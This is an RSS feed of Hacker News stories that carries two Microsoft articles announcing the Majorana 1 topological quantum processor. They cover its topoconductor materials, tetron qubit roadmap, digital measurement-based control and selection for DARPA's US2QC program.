(ignoring known css parsing error)
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 19 Feb 2025 18:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Microsoft unveils Majorana 1 quantum processor (128 pts)]]></title>
            <link>https://azure.microsoft.com/en-us/blog/quantum/2025/02/19/microsoft-unveils-majorana-1-the-worlds-first-quantum-processor-powered-by-topological-qubits/</link>
            <guid>43104071</guid>
            <pubDate>Wed, 19 Feb 2025 16:35:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://azure.microsoft.com/en-us/blog/quantum/2025/02/19/microsoft-unveils-majorana-1-the-worlds-first-quantum-processor-powered-by-topological-qubits/">https://azure.microsoft.com/en-us/blog/quantum/2025/02/19/microsoft-unveils-majorana-1-the-worlds-first-quantum-processor-powered-by-topological-qubits/</a>, See on <a href="https://news.ycombinator.com/item?id=43104071">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-bi-an="Blog Body">
					

					
<p><em>Built with a breakthrough class of materials called a topoconductor, Majorana 1 marks a transformative leap toward practical quantum computing.</em></p>



<p>Quantum computers promise to transform science and society—but only after they achieve the scale that once seemed distant and elusive, and their reliability is ensured by quantum error correction. Today, we’re announcing rapid advancements on the path to useful quantum computing:</p>



<ul>
<li><strong>Majorana 1</strong>: the world’s first Quantum Processing Unit (QPU) powered by a Topological Core, designed to scale to a million qubits on a single chip.</li>



<li><strong>A hardware-protected topological qubit</strong>: research published today in <a href="https://aka.ms/MSQuantumNaturePaper" target="_blank" rel="noreferrer noopener"><em>Nature</em></a>, along with data shared at the Station Q meeting, demonstrate our ability to harness a new type of material and engineer a radically different type of qubit that is small, fast, and digitally controlled.</li>



<li><strong>A <a href="https://aka.ms/MSBrandArXivTopo" target="_blank" rel="noreferrer noopener">device roadmap</a> to reliable quantum computation</strong>: our path from single-qubit devices to arrays that enable quantum error correction.</li>



<li><strong>Building the world’s first fault-tolerant prototype (FTP) based on topological qubits</strong>: Microsoft is on track to build an FTP of a scalable quantum computer—in years, not decades—as part of the final phase of the Defense Advanced Research Projects Agency (DARPA) Underexplored Systems for Utility-Scale Quantum Computing (US2QC) program.</li>
</ul>



<p>Together, these milestones mark a pivotal moment in quantum computing as we advance from scientific exploration to technological innovation.</p>


<div data-moray="" data-bi-an="CTA Block">

			
			<div>
					
					<h2>Microsoft Quantum Innovator Series</h2>

					<p>Join Chetan Nayak to learn about the advancements Microsoft is making in quantum computing.</p>

											
									</div>

							<p><img decoding="async" width="1024" height="576" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-1024x576.webp" alt="Chetan Nayak's headshot." srcset="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-1024x576.webp 1024w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-300x169.webp 300w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-768x432.webp 768w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot-1536x864.webp 1536w, https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Chetan-Headshot.webp 1920w" sizes="(max-width: 1024px) 100vw, 1024px">				</p>
					</div>



<h2 id="harnessing-a-new-type-of-material">Harnessing a new type of material</h2>



<p>All of today’s announcements build on our team’s recent breakthrough: the world’s first topoconductor. This revolutionary class of materials enables us to create <em>topological superconductivity,</em> a <a href="https://journals.aps.org/prb/pdf/10.1103/PhysRevB.107.245423" target="_blank" rel="noreferrer noopener">new state of matter</a> that previously existed only in theory. The advance stems from Microsoft’s innovations in the design and fabrication of gate-defined devices that combine indium arsenide (a semiconductor) and aluminum (a superconductor). When cooled to near absolute zero and tuned with magnetic fields, these devices form topological superconducting nanowires with Majorana Zero Modes (MZMs) at the wires’ ends.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;67b6230045a7d&quot;}" data-wp-interactive="core/image"><img decoding="async" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Measurement-graphic.webp" alt="A graphic showcasing reliably reading quantum information: ease of measurement and distinct results." srcset="" data-orig-src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Measurement-graphic.webp"><figcaption><em>Figure 1: Reading the state of our topological qubit</em>.</figcaption></figure>



<p>For nearly a century, these quasiparticles existed only in textbooks. Now, we can <a href="https://quantum.microsoft.com/en-us/solutions/microsoft-quantum-hardware" target="_blank" rel="noreferrer noopener">create and control them on demand in our topoconductors</a>. MZMs are the building blocks of our qubits, storing quantum information through ‘parity’—whether the wire contains an even or odd number of electrons. In conventional superconductors, electrons bind into Cooper pairs and move without resistance. Any unpaired electron can be detected because its presence requires extra energy. Our topoconductors are different: here, an unpaired electron is shared between a pair of MZMs, making it invisible to the environment. This unique property protects the quantum information.</p>



<p>While this makes our topoconductors ideal candidates for qubits, it also presents a challenge: How do we read quantum information that is so well hidden? How can we distinguish between, say, 1,000,000,000 and 1,000,000,001 electrons?</p>



<p>Our solution to this measurement challenge works as follows (also see Figure 1):</p>



<ul>
<li>We use digital switches to couple both ends of the nanowire to a quantum dot, which is a tiny semiconductor device that can store electrical charge.</li>



<li>This connection increases the dot’s ability to hold charge. Crucially, the exact increase depends on the parity of the nanowire.</li>



<li>We measure this change using microwaves. The dot’s ability to hold charge determines how the microwaves reflect off the quantum dot. As a result, they return carrying an imprint of the nanowire’s quantum state.</li>
</ul>



<p>We designed our devices so these changes are large enough to measure reliably in a single shot. Our initial measurements had an error probability of 1%, and we’ve identified clear paths to significantly reduce this.</p>



<p>Our system shows impressive stability. External energy—such as electromagnetic radiation—can break Cooper pairs, creating unpaired electrons that can flip the qubit’s state from even to odd parity. However, our results show that this is rare, occurring only once per millisecond on average. This indicates that the shielding that envelops our processor is effective at keeping such radiation out. We are exploring ways to reduce this even further.</p>



<p>It’s perhaps not surprising that quantum computation would require us to engineer a new state of matter specifically designed to enable it. What’s remarkable is how accurate our readout technique already is, demonstrating that we are harnessing this exotic state of matter for quantum computation.</p>



<h2 id="revolutionizing-quantum-control-through-digital-precision">Revolutionizing quantum control through digital precision</h2>



<p>This readout technique enables a fundamentally different approach to quantum computing in which measurements are used to perform calculations.</p>



<p>Traditional quantum computing rotates quantum states through precise angles, requiring complex analog control signals customized for each qubit. This complicates quantum error correction (QEC), which must rely on these same sensitive operations to detect and correct errors.</p>



<p>Our measurement-based approach simplifies QEC dramatically. We perform error correction entirely through measurements activated by simple digital pulses that connect and disconnect quantum dots from nanowires. This digital control makes it practical to manage the large numbers of qubits needed for real-world applications.</p>



<h2 id="from-physics-to-engineering">From physics to engineering</h2>


<figure data-wp-context="{&quot;imageId&quot;:&quot;67b6230046960&quot;}" data-wp-interactive="core/image"><img decoding="async" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Device-Roadmap-figure.webp" alt="A roadmap to fault-tolerant quantum computation with tetrons." srcset="" data-orig-src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2025/02/Device-Roadmap-figure.webp"><figcaption><em>Figure 2: Roadmap to fault-tolerant quantum computation with tetrons. The first panel shows a single-qubit device. The tetron is formed through two parallel topological wires (blue) with an MZM at each end (orange dot) connected by a perpendicular trivial superconducting wire (light blue). The next panel shows a two-qubit device that supports measurement-based braiding transformations. The third panel shows a 4×2 array of tetrons supporting a quantum error detection demonstration on two logical qubits. These demonstrations build toward quantum error correction, such as on the device shown in the right panel (a 27×13 tetron array).</em></figcaption></figure>



<p>With the core building blocks now demonstrated—quantum information encoded in MZMs, protected by topology, and processed through measurements—we’re ready to move from physics breakthrough to practical implementation.</p>



<p>The next step is <a href="https://aka.ms/MSBrandArXivTopo" target="_blank" rel="noreferrer noopener">a scalable architecture</a> built around a single-qubit device called a tetron (see Figure 2). At the Station Q meeting, we shared data demonstrating the basic operation of this qubit. One fundamental operation—measuring the parity of one of the topological nanowires in a tetron—uses the same technique described in our <a href="https://aka.ms/MSQuantumNaturePaper" target="_blank" rel="noreferrer noopener"><em>Nature </em>paper</a>.</p>



<p>Another key operation puts the qubit in a superposition of parity states. This, too, is performed by a microwave reflectometry measurement of a quantum dot, but in a different measurement configuration in which we decouple the first quantum dot from the nanowire and connect a different dot to both nanowires at one end of the device. By performing these two orthogonal Pauli measurements, <em>Z</em> and <em>X</em>, we’ve demonstrated measurement-based control—a crucial milestone that unlocks the next steps on our roadmap.</p>



<p>Our roadmap now leads systematically toward scalable QEC. The next steps will involve a 4×2 tetron array. We will first use a two-qubit subset to demonstrate entanglement and measurement-based braiding transformations. Using the entire eight-qubit array, we will then implement quantum error detection on two logical qubits.</p>



<p>The built-in error protection of topological qubits simplifies QEC. Moreover, our <a href="https://www.microsoft.com/en-us/research/blog/azure-quantum-innovation-efficient-error-correction-of-topological-qubits-with-floquet-codes/" target="_blank" rel="noreferrer noopener">custom QEC codes</a> reduce overhead roughly tenfold compared to <a href="https://www.microsoft.com/en-us/research/publication/optimization-of-the-surface-code-design-for-majorana-based-qubits/" target="_blank" rel="noreferrer noopener">the previous state-of-the-art approach</a>. This dramatic reduction means that our scalable system can be built from fewer physical qubits and has the potential to run at a faster clock speed.</p>



<h2 id="darpa-s-recognition-of-our-approach">DARPA’s recognition of our approach</h2>



<p>The Defense Advanced Research Projects Agency <a href="https://www.darpa.mil/news/2025/quantum-computing-approaches" target="_blank" rel="noreferrer noopener">(DARPA) has selected Microsoft</a> as one of two companies to advance to the final phase of their rigorous benchmarking program known as <a href="https://www.darpa.mil/research/programs/underexplored-systems-for-utility-scale-quantum-computing" target="_blank" rel="noreferrer noopener">Underexplored Systems for Utility-Scale Quantum Computing (US2QC)</a>—one of the programs that makes up DARPA’s larger Quantum Benchmarking Initiative (QBI). Microsoft views this recognition as validation of our roadmap for building a fault-tolerant quantum computer with topological qubits.</p>



<p>DARPA’s US2QC program and its broader Quantum Benchmarking Initiative represent a rigorous approach to evaluating quantum systems that could solve problems that are beyond the capabilities of classical computers. To date, the US2QC program has brought together experts from DARPA, Air Force Research Laboratory, Johns Hopkins University Applied Physics Laboratory, Los Alamos National Laboratory, Oak Ridge National Laboratory, and NASA Ames Research Center to verify quantum hardware, software, and applications. Going forward, the larger Quantum Benchmarking Initiative is expected to engage with even more experts in the testing and evaluation of quantum computers.</p>



<p>Previously, DARPA selected Microsoft for an earlier phase upon an assessment that we could plausibly build a utility-scale quantum computer in a reasonable timeframe. DARPA then evaluated the Microsoft quantum team’s architectural designs and engineering plan for a fault-tolerant quantum computer. As a result of this careful analysis, DARPA and Microsoft have executed an agreement to begin the final phase of the program. During this phase, <strong>Microsoft intends to build a fault-tolerant prototype based on topological qubits in years, not decades</strong>—a crucial acceleration step toward utility-scale quantum computing.</p>



<h2 id="unlocking-quantum-s-promise">Unlocking quantum’s promise</h2>



<p>Eighteen months ago, we laid out our <a href="https://azure.microsoft.com/en-us/blog/quantum/2023/06/21/microsoft-achieves-first-milestone-towards-a-quantum-supercomputer/">roadmap to a quantum supercomputer</a>. <strong>Today we hit our second milestone, demonstrating the world’s first topological qubit. </strong>And we’ve already placed eight topological qubits on a chip designed to house one million.</p>



<p>A million-qubit quantum computer isn’t just a milestone—it’s a gateway to solving some of the world’s most difficult problems. Even today’s most powerful supercomputers cannot accurately predict the quantum processes that determine the properties of the materials essential to our future. But quantum computing at this scale could lead to innovations like self-healing materials that repair cracks in bridges, sustainable agriculture, and safer chemical discovery. What today requires billions of dollars in exhaustive experimental searches and wet-lab experiments could be found, instead, through calculation on a quantum computer.</p>



<p>Our path to useful quantum computing is clear. The foundational technology is proven, and we believe our architecture is scalable. Our new agreement with DARPA shows a commitment to relentless progress toward our goal: building a machine that can drive scientific discovery and solve problems that matter. Stay tuned for more updates on our journey.</p>



<p><strong>Stay informed of Microsoft’s advancements in quantum computing:</strong></p>



<ul>
<li>Check out Dr. Chetan Nayak on the <a href="https://aka.ms/MSRPodTopo" target="_blank" rel="noreferrer noopener">Microsoft Research Podcast</a> as he explores these groundbreaking advances.</li>



<li>Read our papers in <a href="https://aka.ms/MSQuantumNaturePaper" target="_blank" rel="noreferrer noopener"><em>Nature</em></a> and on <a href="https://aka.ms/MSBrandArXivTopo" target="_blank" rel="noreferrer noopener">arXiv</a>.</li>



<li>Join us to <a href="https://aka.ms/QuantumReadyPage" target="_blank" rel="noreferrer noopener">become quantum ready</a>.</li>



<li>Read the <a href="https://aka.ms/MSQuantumSource" target="_blank" rel="noreferrer noopener">Microsoft Source story</a> about today’s news.</li>



<li>Hear the Microsoft quantum team discuss these milestones:</li>
</ul>



<figure><p>
<iframe title="Majorana 1 Explained: The Path to a Million Qubits" width="500" height="281" src="https://www.youtube-nocookie.com/embed/wSHmygPQukQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>





					
<div data-bi-an="Author Bio">
			<div>
						<p><img width="170" height="170" src="https://azure.microsoft.com/en-us/blog/quantum/wp-content/uploads/2020/08/Chetan-Nayak-bio-picture-250x250.jpg" alt="Chetan Nayak bio picture">						</p>
					</div>
			<div>
				<div>
					

											<p>
							Technical Fellow and Corporate Vice President of Quantum Hardware						</p>
					
											
									</div>

									<p>
						Chetan Nayak leads Microsoft’s efforts to build a scaled quantum computer based on topological qubits.					</p>
				
				<p><a href="https://azure.microsoft.com/en-us/blog/quantum/author/chetan-nayak/" data-bi-cn="See more articles from this author" data-bi-id="5331" data-bi-ct="cta link" rel="author" aria-label="
						See more articles from Chetan Nayak					">
					See more articles from this author				</a>
			</p></div>
		</div>

					
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft's Majorana 1 chip carves new path for quantum computing (102 pts)]]></title>
            <link>https://news.microsoft.com/source/features/ai/microsofts-majorana-1-chip-carves-new-path-for-quantum-computing/</link>
            <guid>43103623</guid>
            <pubDate>Wed, 19 Feb 2025 16:06:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.microsoft.com/source/features/ai/microsofts-majorana-1-chip-carves-new-path-for-quantum-computing/">https://news.microsoft.com/source/features/ai/microsofts-majorana-1-chip-carves-new-path-for-quantum-computing/</a>, See on <a href="https://news.ycombinator.com/item?id=43103623">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>Microsoft today <a href="https://news.microsoft.com/azure-quantum/">introduced Majorana 1</a>, the world’s first quantum chip powered by a new Topological Core architecture that it expects will realize quantum computers capable of solving meaningful, industrial-scale problems in years, not decades.</p>



<p>It leverages the world’s first topoconductor, a breakthrough type of material which can observe and control Majorana particles to produce more reliable and scalable qubits, which are the building blocks for quantum computers.</p>



<p>In the same way that the invention of semiconductors made today’s smartphones, computers and electronics possible, <a href="https://aka.ms/MSQuantumAQblog">topoconductors and the new type of chip they enable</a> offer a path to developing quantum systems that can scale to a million qubits and are capable of tackling the most complex industrial and societal problems, Microsoft said.</p>



<p>“We took a step back and said ‘OK, let’s invent the transistor for the quantum age. What properties does it need to have?’” said Chetan Nayak, Microsoft technical fellow. “And that’s really how we got here – it’s the particular combination, the quality and the important details in our new materials stack that have enabled a new kind of qubit and ultimately our entire architecture.”</p>



<figure><img fetchpriority="high" decoding="async" width="319" height="300" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1.jpg" alt="Photo showing a close up of the Majorana 1 quantum chip being held in a hand." srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1.jpg 319w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1-128x120.jpg 128w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1-300x282.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Majorana-1-009-300x300-1-213x200.jpg 213w" sizes="(max-width: 319px) 100vw, 319px"><figcaption>The Majorana 1. Photo by John Brecher for Microsoft.</figcaption></figure>



<p>This new architecture used to develop the Majorana 1 processor offers a clear path to fit a million qubits on a single chip that can fit in the palm of one’s hand, Microsoft said. This is a needed threshold for quantum computers to deliver transformative, real-world solutions – such as breaking down microplastics into harmless byproducts or inventing self-healing materials for construction, manufacturing or healthcare. All the world’s current computers operating together can’t do what a one-million-qubit quantum computer will be able to do.&nbsp;</p>



<p>“Whatever you’re doing in the quantum space needs to have a path to a million qubits. If it doesn’t, you’re going to hit a wall before you get to the scale at which you can solve the really important problems that motivate us,” Nayak said.&nbsp; “We have actually worked out a path to a million.”</p>



<p>The topoconductor, or topological superconductor, is a special category of material that can create an entirely new state of matter – not a solid, liquid or gas but a topological state. This is harnessed to produce a more stable qubit that is fast, small and can be digitally controlled, without the tradeoffs required by current alternatives. A new paper published Wednesday in Nature outlines how Microsoft researchers were able to create the topological qubit’s exotic quantum properties and also accurately measure them, an essential step for practical computing.</p>



<figure><img decoding="async" width="1024" height="683" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1024x683.jpg" alt="Photo of Chetan Nayak." srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1024x683.jpg 1024w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-768x512.jpg 768w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1536x1025.jpg 1536w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-300x200.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak-1900x1268.jpg 1900w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Chetan-Nayak.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Chetan Nayak, Microsoft technical fellow. Photo by John Brecher for Microsoft.&nbsp;&nbsp;</figcaption></figure>



<p>This breakthrough required developing an entirely new materials stack made of indium arsenide and aluminum, much of which Microsoft designed and fabricated atom by atom. The goal was to coax new quantum particles called Majoranas into existence and take advantage of their unique properties to reach the next horizon of quantum computing, Microsoft said. &nbsp;</p>



<p>The world’s first Topological Core powering the Majorana 1 is reliable by design, incorporating error resistance at the hardware level making it more stable.</p>



<p>Commercially important applications will also require trillions of operations on a million qubits, which would be prohibitive with current approaches that rely on fine-tuned analog control of each qubit. The Microsoft team’s new measurement approach enables qubits to be controlled digitally, redefining and vastly simplifying how quantum computing works.</p>



<p>This progress validates Microsoft’s choice years ago to pursue a topological qubit design – a high risk, high reward scientific and engineering challenge that is now paying off. Today, the company has placed eight topological qubits on a chip designed to scale to one million.</p>



<figure><img loading="lazy" decoding="async" width="1024" height="683" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1024x683.jpg" alt="Photo of Matthias Troyer, Microsoft technical fellow, sitting in a lab.&nbsp;" srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1024x683.jpg 1024w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-768x512.jpg 768w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1536x1025.jpg 1536w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-300x200.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer-1900x1268.jpg 1900w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Matthias-Troyer.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Matthias Troyer, Microsoft technical fellow. Photo by John Brecher for Microsoft.&nbsp;</figcaption></figure>



<p>“From the start we wanted to make a quantum computer for commercial impact, not just thought leadership,” said Matthias Troyer, Microsoft technical fellow. “We knew we needed a new qubit. We knew we had to scale.”</p>



<p>That approach led the Defense Advanced Research Projects Agency (DARPA), a federal agency that invests in breakthrough technologies that are important to national security, to include Microsoft in a rigorous program to evaluate whether innovative quantum computing technologies could build commercially relevant quantum systems faster than conventionally believed possible.&nbsp;&nbsp;</p>



<p>Microsoft is now one of two companies to be <a href="https://www.darpa.mil/news/2025/quantum-computing-approaches">invited to move to the final phase</a> of DARPA’s Underexplored Systems for Utility-Scale Quantum Computing (US2QC) program – one of the programs that makes up DARPA’s larger <a href="https://www.darpa.mil/research/programs/quantum-benchmarking-initiative">Quantum Benchmarking Initiative</a> – which aims to deliver the industry’s first utility-scale fault-tolerant quantum computer, or one whose computational value exceeds its costs.&nbsp;</p>



<h2>‘It just gives you the answer’</h2>



<p>In addition to making its own quantum hardware, Microsoft has partnered with Quantinuum and Atom Computing to reach <a href="https://azure.microsoft.com/en-us/blog/quantum/2024/09/10/microsoft-and-quantinuum-create-12-logical-qubits-and-demonstrate-a-hybrid-end-to-end-chemistry-simulation/">scientific and engineering breakthroughs</a> with today’s qubits, including the announcement last year of the <a href="https://azure.microsoft.com/en-us/blog/quantum/2024/11/19/microsoft-and-atom-computing-offer-a-commercial-quantum-machine-with-the-largest-number-of-entangled-logical-qubits-on-record/?msockid=0d710b8d313360371e1f1f27301e6148">industry’s first reliable quantum computer</a>.</p>



<p>These types of machines <a href="https://azure.microsoft.com/en-us/blog/quantum/2025/01/14/2025-the-year-to-become-quantum-ready/?msockid=0d710b8d313360371e1f1f27301e6148">offer important opportunities to develop quantum skills</a>, build hybrid applications and drive new discovery, particularly as AI is combined with new quantum systems that will be powered by larger numbers of reliable qubits. Today, Azure Quantum offers a <a href="https://quantum.microsoft.com/en-us/solutions/azure-quantum-solutions">suite of integrated solutions</a> allowing customers to leverage these leading AI, high performance computing and quantum platforms in Azure to advance scientific discovery.</p>



<p>But reaching the next horizon of quantum computing will require a quantum architecture that can provide a million qubits or more and reach trillions of fast and reliable operations. Today’s announcement puts that horizon within years, not decades, Microsoft said.</p>



<p>Because they can use quantum mechanics to mathematically map how nature behaves with incredible precision – from chemical reactions to molecular interactions and enzyme energies – million-qubit machines should be able to solve certain types of problems in chemistry, materials science and other industries that are impossible for today’s classical computers to accurately calculate.</p>



<ul>
<li>For instance, they could help solve the difficult chemistry question of why materials suffer corrosion or cracks. This could lead to self-healing materials that repair cracks in bridges or airplane parts, shattered phone screens or scratched car doors.</li>
</ul>



<ul>
<li>Because there are so many types of plastics, it isn’t currently possible to find a one-size-fits-all catalyst that can break them down – especially important for cleaning up microplastics or tackling carbon pollution. Quantum computing could calculate the properties of such catalysts to break down pollutants into valuable byproducts or develop non-toxic alternatives in the first place.</li>
</ul>



<ul>
<li>Enzymes, a kind of biological catalyst, could be harnessed more effectively in healthcare and agriculture, thanks to accurate calculations about their behavior that only quantum computing can provide. This could lead to breakthroughs helping to eradicate global hunger: boosting soil fertility to increase yields or promoting sustainable growth of foods in harsh climates.</li>
</ul>



<p>Most of all, quantum computing could allow engineers, scientists, companies and others to simply design things right the first time – which would be transformative for everything from healthcare to product development. The power of quantum computing, combined with AI tools, would allow someone to describe what kind of new material or molecule they want to create in plain language and get an answer that works straightaway – no guesswork or years of trial and error. &nbsp;</p>



<p>“Any company that makes anything could just design it perfectly the first time out. It would just give you the answer,” Troyer said. “The quantum computer teaches the AI the language of nature so the AI can just tell you the recipe for what you want to make.”</p>



<h2>Rethinking quantum computing at scale</h2>



<p>The quantum world operates according to the laws of quantum mechanics, which are not the same laws of physics that govern the world we see. The particles are called qubits, or quantum bits, analogous to the bits, or ones and zeros, that computers now use.</p>



<p>Qubits are finicky and highly susceptible to perturbations and errors that come from their environment, which cause them to fall apart and information to be lost. Their state can also be affected by measurement – a problem because measuring is essential for computing. An inherent challenge is developing a qubit that can be measured and controlled, while offering protection from environmental noise that corrupts them.</p>



<p>Qubits can be created in different ways, each with advantages and disadvantages. Nearly 20 years ago, Microsoft decided to pursue a unique approach: developing topological qubits, which it believed would offer more stable qubits requiring less error correction, thereby unlocking speed, size and controllability advantages. The approach posed a steep learning curve, requiring uncharted scientific and engineering breakthroughs, but also the most promising path to creating scalable and controllable qubits capable of doing commercially valuable work.</p>



<figure><div>
<iframe title="Majorana 1 Explained: The Path to a Million Qubits" width="500" height="281" data-src="https://www.youtube.com/embed/wSHmygPQukQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></div></figure>



<p>The disadvantage is – or was – that until recently the exotic particles Microsoft sought to use, called Majoranas, had never been seen or made. They don’t exist in nature and can only be coaxed into existence with magnetic fields and superconductors. The difficulty of developing the right materials to create the exotic particles and their associated topological state of matter is why most quantum efforts have focused on other kinds of qubits.</p>



<p>The Nature paper marks peer-reviewed confirmation that Microsoft has not only been able to create Majorana particles, which help protect quantum information from random disturbance, but can also reliably measure that information from them using microwaves.</p>



<p>Majoranas hide quantum information, making it more robust, but also harder to measure. The Microsoft team’s new measurement approach is so precise it can detect the difference between one billion and one billion and one electrons in a superconducting wire – which tells the computer what state the qubit is in and forms the basis for quantum computation.</p>



<p>The measurements can be turned on and off with voltage pulses, like flicking a light switch, rather than finetuning dials for each individual qubit. This simpler measurement approach that enables digital control simplifies the quantum computing process and the physical requirements to build a scalable machine.</p>



<p>Microsoft’s topological qubit also has an advantage over other qubits because of its size. Even for something that tiny, there’s a “Goldilocks” zone, where a too-small qubit is hard to run control lines to, but a too-big qubit requires a huge machine, Troyer said. Adding the individualized control technology for those types of qubits would require building an impractical computer the size of an airplane hangar or football field.</p>



<p>Majorana 1, Microsoft’s quantum chip that contains both qubits as well as surrounding control electronics, can be held in the palm of one’s hand and fits neatly into a quantum computer that can be easily deployed inside Azure datacenters.</p>



<p>“It’s one thing to discover a new state of matter,” Nayak said. “It’s another to take advantage of it to rethink quantum computing at scale.”</p>



<h2>Designing quantum materials atom by atom</h2>



<p>Microsoft’s topological qubit architecture has aluminum nanowires joined together to form an H. Each H has four controllable Majoranas and makes one qubit. These Hs can be connected, too, and laid out across the chip like so many tiles.</p>



<p>“It’s complex in that we had to show a new state of matter to get there, but after that, it’s fairly simple. It tiles out. You have this much simpler architecture that promises a much faster path to scale,” said Krysta Svore, Microsoft technical fellow.</p>



<figure><img loading="lazy" decoding="async" width="1024" height="683" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1024x683.jpg" alt="Photo showing a close up of the Majorana 1 quantum chip with brass equipment in the background. " srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1024x683.jpg 1024w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-768x512.jpg 768w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1536x1025.jpg 1536w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-300x200.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1900x1268.jpg 1900w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Krysta Svore, Microsoft technical fellow. Photo by John Brecher for Microsoft.&nbsp;&nbsp;</figcaption></figure>



<p>The quantum chip doesn’t work alone. It exists in an ecosystem with control logic, a dilution refrigerator that keeps qubits at temperatures much colder than outer space and a software stack that can integrate with AI and classical computers. All those pieces exist, built or modified entirely in-house, she said.</p>



<p>To be clear, continuing to refine those processes and getting all the elements to work together at accelerated scale will require more years of engineering work. But many difficult scientific and engineering challenges have now been met, Microsoft said.</p>



<p>Getting the materials stack right to produce a topological state of matter was one of the hardest parts, Svore added. Instead of silicon, Microsoft’s topoconductor is made of indium arsenide, a material currently used in such applications as infrared detectors and which has special properties. The semiconductor is married with superconductivity, thanks to extreme cold, to make a hybrid.</p>



<p>“We are literally spraying atom by atom. Those materials have to line up perfectly. If there are too many defects in the material stack, it just kills your qubit,” Svore said.</p>



